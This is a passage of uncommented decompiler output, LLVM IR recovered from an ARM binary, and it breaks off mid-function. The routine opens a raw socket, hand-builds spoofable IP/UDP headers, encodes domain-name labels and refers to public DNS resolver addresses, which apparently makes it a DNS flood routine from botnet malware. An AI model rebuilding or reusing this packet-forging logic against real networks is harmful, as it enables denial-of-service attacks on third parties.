  %v0_ebcc = phi i32 [ %v0_ebcc39, %dec_label_pc_ebb4 ], [ 0, %dec_label_pc_eb88 ]
  %v0_ebd4 = phi i32 [ %v1_ebd4, %dec_label_pc_ebb4 ], [ %v2_eb98, %dec_label_pc_eb88 ]
  %v1_ebc8 = inttoptr i32 %v0_ebd4 to i8*
  %v2_ebc8 = load i8, i8* %v1_ebc8, align 1
  %v3_ebc8 = zext i8 %v2_ebc8 to i32
  store i32 %v3_ebc8, i32* %r3.global-to-local, align 4
  %v2_ebcc = icmp eq i32 %v0_ebcc, 0
  store i1 %v2_ebcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ebd0, i32* %ip.global-to-local, align 4
  %v1_ebd4 = add i32 %v0_ebd4, 1
  store i32 %v1_ebd4, i32* %r1.global-to-local, align 4
  %v1_ebd8 = add nsw i32 %v3_ebc8, -48
  store i32 %v1_ebd8, i32* %r0.global-to-local, align 4
  br i1 %v2_ebcc, label %dec_label_pc_ebe0, label %dec_label_pc_ebf0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_ebc8
  %v7_ebe0 = icmp eq i8 %v2_ebc8, 9
  store i1 %v7_ebe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe0, label %dec_label_pc_ebb4, label %bb

bb:                                               ; preds = %dec_label_pc_ebe0
  %v8_ebe4 = icmp eq i8 %v2_ebc8, 32
  store i1 %v8_ebe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ebe4, label %dec_label_pc_ebb4, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %bb
  %v1_ebec = add i32 %v0_ebec, 1
  store i32 %v1_ebec, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_ebf0

dec_label_pc_ebf0:                                ; preds = %dec_label_pc_ebc8, %dec_label_pc_ebec
  %v0_ebec44 = phi i32 [ %v0_ebec, %dec_label_pc_ebc8 ], [ %v1_ebec, %dec_label_pc_ebec ]
  %v0_ebcc40 = phi i32 [ %v0_ebcc, %dec_label_pc_ebc8 ], [ %v1_ebec, %dec_label_pc_ebec ]
  %v7_ebf0 = icmp eq i8 %v2_ebc8, 46
  store i1 %v7_ebf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf0, label %dec_label_pc_ebac, label %bb139

bb139:                                            ; preds = %dec_label_pc_ebf0
  %v8_ebf4 = icmp eq i32 %v1_ebd8, 9
  store i1 %v8_ebf4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_ebd8, 10
  br i1 %tmp, label %dec_label_pc_ebac, label %dec_label_pc_ebfc

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebac, %bb139
  %v0_ebb8.lcssa = phi i32 [ %v1_ebd0, %dec_label_pc_ebac ], [ %v0_ebb8, %bb139 ]
  %v2_ec00 = sub i32 %v0_ebb8.lcssa, %v0_eb78
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  store i32 %v2_eb98, i32* %r1.global-to-local, align 4
  store i32 %v2_eba0, i32* %r0.global-to-local, align 4
  %v3_ec0c = call i32 @function_13a18(i32 %v2_eba0, i32 %v2_eb98, i32 %v2_ec00)
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp140 = bitcast i32* %stack_var_-72 to i8*
  store i32 %v2_eba0, i32* %r0.global-to-local, align 4
  %v2_ec1c = load i32, i32* %r7.global-to-local, align 4
  %v3_ec1c = inttoptr i32 %v2_ec1c to i8*
  store i8 0, i8* %v3_ec1c, align 1
  %v3_ec20 = call i32 @inet_addr(i8* %tmp140)
  store i32 %v3_ec20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec28

dec_label_pc_ec2821:                              ; preds = %dec_label_pc_f0e8
  unreachable

dec_label_pc_ec28:                                ; preds = %dec_label_pc_f160, %dec_label_pc_f150, %dec_label_pc_f144, %dec_label_pc_f130, %dec_label_pc_ebfc
  %v29_f12c75 = phi i32 [ %v1_f0ec, %dec_label_pc_f160 ], [ %v1_f0ec, %dec_label_pc_f150 ], [ %v1_f0ec, %dec_label_pc_f144 ], [ %v1_f0ec, %dec_label_pc_f130 ], [ %v3_ec20, %dec_label_pc_ebfc ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_f160 ], [ 104859200, %dec_label_pc_f150 ], [ 707416650, %dec_label_pc_f144 ], [ 134744072, %dec_label_pc_f130 ], [ %v3_ec20, %dec_label_pc_ebfc ]
  store i32 %v6_eaec, i32* %ip.global-to-local, align 4
  %v2_ec2c = icmp eq i32 %v6_eaec, 0
  store i1 %v2_ec2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec2c, label %dec_label_pc_f124, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec28
  store i32 %v6_eaec, i32* %r0.global-to-local, align 4
  %v1_ec38 = inttoptr i32 %v6_eaec to i8*
  %v2_ec38 = call i32 @function_1399c(i8* %v1_ec38)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ec4c = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  %v7_ec50 = icmp eq i32 %v3_ec4c, -1
  store i1 %v7_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec50, label %dec_label_pc_f124, label %dec_label_pc_ec5c

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ec34
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ec68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ec68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_ec7c = call i32 @setsockopt(i32 %v3_ec4c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_ec7c, i32* %r0.global-to-local, align 4
  %v7_ec80 = icmp eq i32 %v7_ec7c, -1
  store i1 %v7_ec80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec80, label %dec_label_pc_f11c, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec5c
  store i32 %v1_e9d8, i32* %r0.global-to-local, align 4
  %v3_ec90 = mul i32 %v7_ea2c, 65536
  store i32 %v3_ec90, i32* %lr.global-to-local, align 4
  %v0_ec94 = load i32, i32* @sl, align 4
  %v3_ec94 = mul i32 %v0_ec94, 65536
  store i32 %v3_ec94, i32* %sl.global-to-local, align 4
  %v0_ec98 = load i32, i32* %r8.global-to-local, align 4
  %v0_ec9c = load i32, i32* %fp.global-to-local, align 4
  %v3_ec9c = mul i32 %v0_ec9c, 65536
  store i32 %v3_ec9c, i32* %r5.global-to-local, align 4
  %v0_eca0 = load i32, i32* %sb.global-to-local, align 4
  %v3_eca0 = mul i32 %v0_eca0, 65536
  store i32 %v3_eca0, i32* %sb.global-to-local, align 4
  %v5_eca4 = trunc i32 %v0_ec98 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ecac = urem i32 %v7_ea2c, 65536
  store i32 %v3_ecac, i32* %r2.global-to-local, align 4
  %v3_ecb0 = urem i32 %v0_ec9c, 65536
  store i32 %v3_ecb0, i32* %r3.global-to-local, align 4
  %v3_ecb4 = urem i32 %v0_eca0, 65536
  store i32 %v3_ecb4, i32* %r4.global-to-local, align 4
  %v3_ecb8 = urem i32 %v0_ec94, 65536
  store i32 %v3_ecb8, i32* %r8.global-to-local, align 4
  %v2_ecbc = icmp eq i32 %v1_e9d8, 0
  store i1 %v2_ecbc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_ecbc, label %dec_label_pc_f10c, label %dec_label_pc_ece0

dec_label_pc_ece0:                                ; preds = %dec_label_pc_ec88
  %v4_ece4 = sext i8 %v5_eca4 to i32
  %v2_ece8 = add i32 %v4_ece4, %v2_ec38
  store i32 %v2_ece8, i32* @fp, align 4
  %v3_ecec = mul i32 %v2_ece8, 65536
  %v1_ecf0 = add i32 %v3_ecec, 1769472
  store i32 %v1_ecf0, i32* %r6.global-to-local, align 4
  %v1_ecf4 = add i32 %v3_ecec, 3080192
  %v1_ed08 = urem i32 %v0_ec94, 256
  %v3_ed18 = udiv i32 %v1_ecf0, 256
  %v1_ed1c = urem i32 %v7_ea2c, 256
  %v1_ed20 = and i32 %v3_ed18, 65280
  %v1_ed24 = urem i32 %v0_eca0, 256
  %v3_ed28 = mul nuw nsw i32 %v1_ed08, 256
  %v1_ed30 = urem i32 %v0_ec9c, 256
  %v3_ed34 = mul nuw nsw i32 %v1_ed24, 256
  %tmp141 = udiv i32 %v0_ec94, 256
  %v4_ed38 = urem i32 %tmp141, 256
  %v5_ed38 = or i32 %v4_ed38, %v3_ed28
  store i32 %v5_ed38, i32* %r8.global-to-local, align 4
  %v4_ed3c = udiv i32 %v1_ecf0, 16777216
  %v5_ed3c = or i32 %v1_ed20, %v4_ed3c
  store i32 %v5_ed3c, i32* %sl.global-to-local, align 4
  %tmp142 = udiv i32 %v0_ec9c, 256
  %v3_ed48 = urem i32 %tmp142, 256
  %v4_ed4c = sdiv i32 %v1_ecf4, 16777216
  %tmp143 = udiv i32 %v7_ea2c, 256
  %v4_ed54 = mul nuw nsw i32 %v1_ed30, 256
  %v5_ed54 = or i32 %v4_ed54, %v3_ed48
  store i32 %v5_ed54, i32* %r5.global-to-local, align 4
  %tmp144 = udiv i32 %v0_eca0, 256
  %v4_ed58 = urem i32 %tmp144, 256
  %v5_ed58 = or i32 %v4_ed58, %v3_ed34
  store i32 %v5_ed58, i32* %sb.global-to-local, align 4
  store i32 %v1_ed1c, i32* %r0.global-to-local, align 4
  %v1_ed64 = add i32 %v2_ec38, 1
  store i32 %v1_ed64, i32* %r7.global-to-local, align 4
  %v3_ed68 = ashr i32 %v1_ecf4, 31
  store i32 %v3_ed68, i32* %lr.global-to-local, align 4
  store i32 %v1_ed30, i32* %r1.global-to-local, align 4
  store i32 %v1_ed24, i32* %r2.global-to-local, align 4
  %v3_ed7476 = udiv i32 %v1_ed20, 256
  store i32 %v3_ed7476, i32* %r3.global-to-local, align 4
  store i32 %v1_ed08, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_edd8 = sext i8 %v5_ea28 to i32
  %sext14 = mul i32 %v6_ea44, 16777216
  %v4_edf0 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %tmp143, 16777216
  %v4_ee04 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v7_ea2c, 16777216
  %v4_ee08 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_ecf0, 256
  %v4_ee38 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_eca0, 16777216
  %v4_ee3c = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_ec9c, 16777216
  %v4_ee60 = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_ec94, 16777216
  %v4_ee6c = sdiv i32 %sext20, 16777216
  %v1_ede8 = trunc i32 %v4_ed4c to i8
  %extract.t = trunc i32 %v3_ed68 to i8
  br label %dec_label_pc_ed98

dec_label_pc_ed98:                                ; preds = %dec_label_pc_ef00, %dec_label_pc_ece0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_eda0 = call i32* @calloc(i32 600, i32 1)
  %v4_eda0 = ptrtoint i32* %v2_eda0 to i32
  store i32 %v4_eda0, i32* %r0.global-to-local, align 4
  store i32 %v4_e9f0, i32* %lr.global-to-local, align 4
  %v3_eda8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_eda8, i32* %r3.global-to-local, align 4
  %v2_edac = load i32, i32* %r4.global-to-local, align 4
  %v5_edac = mul i32 %v2_edac, 4
  %v6_edac = add i32 %v5_edac, %v4_e9f0
  %v7_edac = inttoptr i32 %v6_edac to i32*
  store i32 %v4_eda0, i32* %v7_edac, align 4
  %v0_edb0 = load i32, i32* %lr.global-to-local, align 4
  %v1_edb0 = load i32, i32* %r3.global-to-local, align 4
  %v4_edb0 = mul i32 %v1_edb0, 4
  %v5_edb0 = add i32 %v4_edb0, %v0_edb0
  %v6_edb0 = inttoptr i32 %v5_edb0 to i32*
  %v7_edb0 = load i32, i32* %v6_edb0, align 4
  store i32 %v7_edb0, i32* %r1.global-to-local, align 4
  %v1_edb4 = inttoptr i32 %v7_edb0 to i8*
  %v2_edb4 = load i8, i8* %v1_edb4, align 1
  %tmp156 = urem i8 %v2_edb4, 16
  %v1_edb8 = zext i8 %tmp156 to i32
  %v1_edbc = or i32 %v1_edb8, 64
  store i32 %v1_edbc, i32* %r2.global-to-local, align 4
  %v1_edc0 = trunc i32 %v1_edbc to i8
  store i8 %v1_edc0, i8* %v1_edb4, align 1
  %v0_edc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_edc4 = inttoptr i32 %v0_edc4 to i8*
  %v2_edc4 = load i8, i8* %v1_edc4, align 1
  %v1_edc8 = and i8 %v2_edc4, -16
  %v1_edcc = or i8 %v1_edc8, 5
  store i32 %v1_ea70, i32* %r0.global-to-local, align 4
  store i8 %v1_edcc, i8* %v1_edc4, align 1
  store i32 %v4_edd8, i32* %r2.global-to-local, align 4
  %v2_eddc = load i32, i32* %r1.global-to-local, align 4
  %v3_eddc = add i32 %v2_eddc, 1
  %v4_eddc = inttoptr i32 %v3_eddc to i8*
  store i8 %v5_ea28, i8* %v4_eddc, align 1
  store i32 %v4_ed4c, i32* %r3.global-to-local, align 4
  %v0_ede4 = load i32, i32* %r0.global-to-local, align 4
  %v2_ede4 = icmp eq i32 %v0_ede4, 0
  store i1 %v2_ede4, i1* %cpsr_z.global-to-local, align 1
  %v2_ede8 = load i32, i32* %r1.global-to-local, align 4
  %v3_ede8 = add i32 %v2_ede8, 2
  %v4_ede8 = inttoptr i32 %v3_ede8 to i8*
  store i8 %v1_ede8, i8* %v4_ede8, align 1
  store i32 %v3_ed68, i32* %r4.global-to-local, align 4
  store i32 %v4_edf0, i32* %r0.global-to-local, align 4
  %v0_edf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_edf4, label %.thread22, label %bb145

bb145:                                            ; preds = %dec_label_pc_ed98
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_edf8 = load i32, i32* %r1.global-to-local, align 4
  %v4_edf8 = add i32 %v3_edf8, 6
  %v5_edf8 = inttoptr i32 %v4_edf8 to i8*
  store i8 64, i8* %v5_edf8, align 1
  %v0_ee00.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t77 = trunc i32 %v0_ee00.pre to i8
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_ed98, %bb145
  %v0_ee00.off0 = phi i8 [ %extract.t, %dec_label_pc_ed98 ], [ %extract.t77, %bb145 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_ee00 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee00 = add i32 %v2_ee00, 3
  %v4_ee00 = inttoptr i32 %v3_ee00 to i8*
  store i8 %v0_ee00.off0, i8* %v4_ee00, align 1
  store i32 %v4_ee04, i32* %ip.global-to-local, align 4
  store i32 %v4_ee08, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* %r4.global-to-local, align 4
  %v0_ee10 = load i32, i32* %r0.global-to-local, align 4
  %v1_ee10 = trunc i32 %v0_ee10 to i8
  %v2_ee10 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee10 = add i32 %v2_ee10, 8
  %v4_ee10 = inttoptr i32 %v3_ee10 to i8*
  store i8 %v1_ee10, i8* %v4_ee10, align 1
  %v0_ee14 = load i32, i32* %r3.global-to-local, align 4
  %v1_ee14 = trunc i32 %v0_ee14 to i8
  %v2_ee14 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee14 = add i32 %v2_ee14, 9
  %v4_ee14 = inttoptr i32 %v3_ee14 to i8*
  store i8 %v1_ee14, i8* %v4_ee14, align 1
  %v0_ee18 = load i32, i32* %lr.global-to-local, align 4
  %v1_ee18 = trunc i32 %v0_ee18 to i8
  %v2_ee18 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee18 = add i32 %v2_ee18, 5
  %v4_ee18 = inttoptr i32 %v3_ee18 to i8*
  store i8 %v1_ee18, i8* %v4_ee18, align 1
  %v0_ee1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee1c, label %.thread23, label %bb146

.thread23:                                        ; preds = %.thread22
  %v2_ee2024 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_ee2024, i32* %r3.global-to-local, align 4
  store i32 %v4_ece4, i32* %lr.global-to-local, align 4
  br label %bb147

bb146:                                            ; preds = %.thread22
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ee20 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_ee20, i32* %r3.global-to-local, align 4
  store i32 %v4_ece4, i32* %lr.global-to-local, align 4
  %v3_ee28 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee28 = add i32 %v3_ee28, 7
  %v5_ee28 = inttoptr i32 %v4_ee28 to i8*
  store i8 0, i8* %v5_ee28, align 1
  %v0_ee30.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_ee34.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %.thread23, %bb146
  %v0_ee34 = phi i32 [ %v2_ee2024, %.thread23 ], [ %v0_ee34.pre, %bb146 ]
  %v0_ee30 = phi i32 [ %v4_ece4, %.thread23 ], [ %v0_ee30.pre, %bb146 ]
  %v0_ee2c = load i32, i32* %r1.global-to-local, align 4
  %v1_ee2c = add i32 %v0_ee30, 41
  %v2_ee30 = add i32 %v1_ee2c, %v0_ee2c
  store i32 %v2_ee30, i32* %r4.global-to-local, align 4
  %v2_ee34 = add i32 %v0_ee2c, 12
  %v3_ee34 = inttoptr i32 %v2_ee34 to i32*
  store i32 %v0_ee34, i32* %v3_ee34, align 4
  store i32 %v4_ee38, i32* %r2.global-to-local, align 4
  store i32 %v4_ee3c, i32* %r3.global-to-local, align 4
  %v0_ee40 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee40 = add i32 %v0_ee40, 20
  store i32 %v1_ee40, i32* %r0.global-to-local, align 4
  %v0_ee44 = load i32, i32* %ip.global-to-local, align 4
  %v1_ee44 = trunc i32 %v0_ee44 to i8
  %v3_ee44 = add i32 %v0_ee40, 4
  %v4_ee44 = inttoptr i32 %v3_ee44 to i8*
  store i8 %v1_ee44, i8* %v4_ee44, align 1
  %v0_ee48 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee48 = trunc i32 %v0_ee48 to i8
  %v2_ee48 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee48 = add i32 %v2_ee48, 5
  %v4_ee48 = inttoptr i32 %v3_ee48 to i8*
  store i8 %v1_ee48, i8* %v4_ee48, align 1
  %v0_ee4c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee4c = trunc i32 %v0_ee4c to i8
  %v2_ee4c = load i32, i32* %r0.global-to-local, align 4
  %v3_ee4c = add i32 %v2_ee4c, 3
  %v4_ee4c = inttoptr i32 %v3_ee4c to i8*
  store i8 %v1_ee4c, i8* %v4_ee4c, align 1
  %v0_ee50 = load i32, i32* %sb.global-to-local, align 4
  %v1_ee50 = trunc i32 %v0_ee50 to i8
  %v2_ee50 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee50 = add i32 %v2_ee50, 2
  %v4_ee50 = inttoptr i32 %v3_ee50 to i8*
  store i8 %v1_ee50, i8* %v4_ee50, align 1
  %v0_ee54 = load i32, i32* %sl.global-to-local, align 4
  %v1_ee54 = trunc i32 %v0_ee54 to i8
  %v2_ee54 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee54 = add i32 %v2_ee54, 4
  %v4_ee54 = inttoptr i32 %v3_ee54 to i8*
  store i8 %v1_ee54, i8* %v4_ee54, align 1
  %v0_ee58 = load i32, i32* %r5.global-to-local, align 4
  %v1_ee58 = trunc i32 %v0_ee58 to i8
  %v2_ee58 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee58 = add i32 %v2_ee58, 20
  %v4_ee58 = inttoptr i32 %v3_ee58 to i8*
  store i8 %v1_ee58, i8* %v4_ee58, align 1
  store i32 %v4_ee60, i32* %r2.global-to-local, align 4
  %v1_ee64 = load i32, i32* %r1.global-to-local, align 4
  %v2_ee64 = add i32 %v1_ee64, 16
  %v3_ee64 = inttoptr i32 %v2_ee64 to i32*
  store i32 %stack_var_-2176.0, i32* %v3_ee64, align 4
  %v0_ee68 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee68 = trunc i32 %v0_ee68 to i8
  %v2_ee68 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee68 = add i32 %v2_ee68, 1
  %v4_ee68 = inttoptr i32 %v3_ee68 to i8*
  store i8 %v1_ee68, i8* %v4_ee68, align 1
  store i32 %v4_ee6c, i32* %lr.global-to-local, align 4
  store i32 %v4_ece4, i32* %r0.global-to-local, align 4
  %v0_ee74 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee74 = add i32 %v0_ee74, 28
  store i32 %v1_ee74, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ee80 = load i32, i32* %r8.global-to-local, align 4
  %v1_ee80 = trunc i32 %v0_ee80 to i8
  %v4_ee80 = inttoptr i32 %v1_ee74 to i8*
  store i8 %v1_ee80, i8* %v4_ee80, align 1
  %v0_ee84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ee84 = trunc i32 %v0_ee84 to i8
  %v2_ee84 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee84 = add i32 %v2_ee84, 5
  %v4_ee84 = inttoptr i32 %v3_ee84 to i8*
  store i8 %v1_ee84, i8* %v4_ee84, align 1
  %v0_ee88 = load i32, i32* %lr.global-to-local, align 4
  %v1_ee88 = trunc i32 %v0_ee88 to i8
  %v2_ee88 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee88 = add i32 %v2_ee88, 1
  %v4_ee88 = inttoptr i32 %v3_ee88 to i8*
  store i8 %v1_ee88, i8* %v4_ee88, align 1
  %v0_ee8c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee8c = trunc i32 %v0_ee8c to i8
  %v2_ee8c = load i32, i32* %ip.global-to-local, align 4
  %v3_ee8c = add i32 %v2_ee8c, 2
  %v4_ee8c = inttoptr i32 %v3_ee8c to i8*
  store i8 %v1_ee8c, i8* %v4_ee8c, align 1
  %v0_ee90 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee90 = trunc i32 %v0_ee90 to i8
  %v2_ee90 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee90 = add i32 %v2_ee90, 3
  %v4_ee90 = inttoptr i32 %v3_ee90 to i8*
  store i8 %v1_ee90, i8* %v4_ee90, align 1
  %v0_ee94 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee94 = trunc i32 %v0_ee94 to i8
  %v2_ee94 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee94 = add i32 %v2_ee94, 4
  %v4_ee94 = inttoptr i32 %v3_ee94 to i8*
  store i8 %v1_ee94, i8* %v4_ee94, align 1
  %v0_ee98 = load i32, i32* %r0.global-to-local, align 4
  %v1_ee98 = trunc i32 %v0_ee98 to i8
  %v2_ee98 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee98 = add i32 %v2_ee98, 40
  %v4_ee98 = inttoptr i32 %v3_ee98 to i8*
  store i8 %v1_ee98, i8* %v4_ee98, align 1
  store i32 %v6_eaec, i32* %r1.global-to-local, align 4
  %v0_eea0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_eea0, i32* %r2.global-to-local, align 4
  %v0_eea4 = load i32, i32* %r4.global-to-local, align 4
  %v1_eea4 = add i32 %v0_eea4, 1
  store i32 %v1_eea4, i32* %r0.global-to-local, align 4
  %v3_eea8 = call i32 @function_13a18(i32 %v1_eea4, i32 %v6_eaec, i32 %v0_eea0)
  store i32 %v3_eea8, i32* %r0.global-to-local, align 4
  store i32 %v2_ec38, i32* %r1.global-to-local, align 4
  %v1_eeb0 = load i32, i32* %r6.global-to-local, align 4
  %v9_eeb0 = icmp eq i32 %v2_ec38, %v1_eeb0
  store i1 %v9_eeb0, i1* %cpsr_z.global-to-local, align 1
  %v7_eeb4 = icmp sgt i32 %v2_ec38, %v1_eeb0
  store i32 %v1_eeb0, i32* %lr.global-to-local, align 4
  %v0_eec4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_eec4, i32* %r2.global-to-local, align 4
  %extract.t79 = trunc i32 %v1_eeb0 to i8
  br i1 %v7_eeb4, label %dec_label_pc_eec0, label %dec_label_pc_ef00

dec_label_pc_eec0:                                ; preds = %bb147
  store i32 %v1_eeb0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eecc

dec_label_pc_eecc:                                ; preds = %bb150, %dec_label_pc_eec0
  %v0_eee886153 = phi i32 [ %v0_eee886154, %bb150 ], [ %v1_eeb0, %dec_label_pc_eec0 ]
  %v1_eedc34 = phi i32 [ %v1_eeec92, %bb150 ], [ %v1_eeb0, %dec_label_pc_eec0 ]
  %v1_eed8.off0 = phi i8 [ %v1_eed857.off0, %bb150 ], [ %extract.t79, %dec_label_pc_eec0 ]
  %v0_eedc33 = phi i32 [ %v0_eedc335589, %bb150 ], [ %v0_eec4, %dec_label_pc_eec0 ]
  store i32 %v6_eaec, i32* %ip.global-to-local, align 4
  %v2_eed0 = add i32 %v1_eedc34, %v6_eaec
  %v3_eed0 = inttoptr i32 %v2_eed0 to i8*
  %v4_eed0 = load i8, i8* %v3_eed0, align 1
  %v6_eed0 = zext i8 %v4_eed0 to i32
  store i32 %v6_eed0, i32* %r3.global-to-local, align 4
  %v7_eed4 = icmp eq i8 %v4_eed0, 46
  store i1 %v7_eed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed4, label %bb148, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_eecc
  %v2_eedc35 = add i32 %v1_eedc34, %v0_eedc33
  store i32 %v2_eedc35, i32* %r0.global-to-local, align 4
  br label %.thread36

bb148:                                            ; preds = %dec_label_pc_eecc
  %v3_eed8 = load i32, i32* %r2.global-to-local, align 4
  %v4_eed8 = inttoptr i32 %v3_eed8 to i8*
  store i8 %v1_eed8.off0, i8* %v4_eed8, align 1
  %v0_eee0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_eedc = load i32, i32* %r4.global-to-local, align 4
  %v1_eedc = load i32, i32* %r1.global-to-local, align 4
  %v2_eedc = add i32 %v1_eedc, %v0_eedc
  store i32 %v2_eedc, i32* %r0.global-to-local, align 4
  br i1 %v0_eee0.pr, label %bb149, label %bb148..thread36_crit_edge

bb148..thread36_crit_edge:                        ; preds = %bb148
  %v0_eee886.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread36

bb149:                                            ; preds = %bb148
  %v2_eee0 = add i32 %v2_eedc, 1
  store i32 %v2_eee0, i32* %r2.global-to-local, align 4
  store i32 %v2_ec38, i32* %r0.global-to-local, align 4
  %v0_eee8 = load i32, i32* %lr.global-to-local, align 4
  %v1_eee8 = add i32 %v0_eee8, 1
  store i32 %v1_eee8, i32* %ip.global-to-local, align 4
  %v1_eeec = add i32 %v1_eedc, 1
  store i32 %v1_eeec, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb150

.thread36:                                        ; preds = %bb148..thread36_crit_edge, %.thread32
  %v0_eee886 = phi i32 [ %v0_eee886.pre, %bb148..thread36_crit_edge ], [ %v0_eee886153, %.thread32 ]
  %v0_eeec.ph = phi i32 [ %v1_eedc, %bb148..thread36_crit_edge ], [ %v1_eedc34, %.thread32 ]
  %v0_eedc3355.ph = phi i32 [ %v0_eedc, %bb148..thread36_crit_edge ], [ %v0_eedc33, %.thread32 ]
  store i32 %v2_ec38, i32* %r0.global-to-local, align 4
  %v1_eee887 = add i32 %v0_eee886, 1
  store i32 %v1_eee887, i32* %ip.global-to-local, align 4
  %v1_eeec88 = add i32 %v0_eeec.ph, 1
  store i32 %v1_eeec88, i32* %r1.global-to-local, align 4
  %v2_eef4 = urem i32 %v1_eee887, 256
  store i32 %v2_eef4, i32* %lr.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_eee887 to i8
  br label %bb150

bb150:                                            ; preds = %bb149, %.thread36
  %v0_eee886154 = phi i32 [ 0, %bb149 ], [ %v2_eef4, %.thread36 ]
  %v1_eeec92 = phi i32 [ %v1_eeec, %bb149 ], [ %v1_eeec88, %.thread36 ]
  %v0_eedc335589 = phi i32 [ %v0_eedc, %bb149 ], [ %v0_eedc3355.ph, %.thread36 ]
  %v1_eed857.off0 = phi i8 [ 0, %bb149 ], [ %extract.t82, %.thread36 ]
  %v9_eef8 = icmp eq i32 %v2_ec38, %v1_eeec92
  store i1 %v9_eef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_eef8, label %dec_label_pc_ef00.loopexit, label %dec_label_pc_eecc

dec_label_pc_ef00.loopexit:                       ; preds = %bb150
  %v2_ef00.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef00

dec_label_pc_ef00:                                ; preds = %dec_label_pc_ef00.loopexit, %bb147
  %v2_ef00 = phi i32 [ %v2_ef00.pre, %dec_label_pc_ef00.loopexit ], [ %v0_eec4, %bb147 ]
